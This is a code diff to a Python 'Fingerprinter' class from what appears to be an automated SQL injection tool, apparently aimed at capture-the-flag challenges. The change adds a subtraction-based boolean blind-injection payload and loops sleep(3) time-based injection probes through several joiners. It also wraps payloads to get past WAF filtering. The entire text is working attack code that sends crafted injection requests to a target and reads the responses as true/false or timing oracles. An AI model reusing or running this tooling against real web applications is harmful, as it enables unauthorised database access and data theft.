@@ -25,14 +25,17 @@ class Fingerprinter:
             else self.inj.base_value + self.inj.closure
 
     def _tail(self) -> str:
-        return self.inj.comment if self.inj.comment not in ("quote-close", "none") else ""
+        return self.inj.tail_literal()
 
     def _cond_payload(self, cond: str, joiner: str = "and") -> str:
         """形态感知的布尔条件 payload（builder 可用时走 WAF 感知链）。"""
         fn = {"or": self.b.logic_or, "and": self.b.logic_and,
-              "xor": self.b.logic_xor}.get(joiner, self.b.logic_and)
+              "xor": self.b.logic_xor,
+              "arith": self.b.logic_arith}.get(joiner, self.b.logic_and)
         if self.b is not None:
             return self.b.wrap(fn(cond))
+        if joiner == "arith":
+            return f"{self._pre()}-{apply_form(f'({cond})', self.inj.form)}{self._tail()}"
         return f"{self._pre()}{apply_form(f' {joiner} ({cond})', self.inj.form)}{self._tail()}"
 
     def run(self, waf) -> Fingerprint:
@@ -41,8 +44,9 @@ class Fingerprinter:
         fp.echo_visible = bool(self.inj.echo_positions)
         notes = []
 
-        # 布尔盲注（or 优先：登录框恒真=成功页；and：查询框真=基线；xor：FinalSQL 类）
-        for joiner in ("or", "and", "xor"):
+        # 布尔盲注（or 优先：登录框恒真=成功页；and：查询框真=基线；
+        # xor：FinalSQL 类；arith：「都过滤了」类减法两态）
+        for joiner in ("or", "and", "xor", "arith"):
             t = self.s.request_value(self._cond_payload("1=1", joiner))
             f = self.s.request_value(self._cond_payload("1=2", joiner))
             fp.boolean_oracle = (t.status_code > 0 and
@@ -50,10 +54,13 @@ class Fingerprinter:
             if fp.boolean_oracle:
                 break
 
-        # 时间盲注
+        # 时间盲注（逐 joiner 尝试：and 被拦时 or/arith 仍可能延时）
         if not waf.is_filtered("sleep"):
-            r = self.s.request_value(self._cond_payload("sleep(3)"))
-            fp.time_oracle = r.elapsed_ms >= 2800
+            for joiner in ("or", "and", "xor", "arith"):
+                r = self.s.request_value(self._cond_payload("sleep(3)", joiner))
+                if r.elapsed_ms >= 2800:
+                    fp.time_oracle = True
+                    break
         else:
             notes.append("sleep 被过滤，时间盲注判定受限")
 
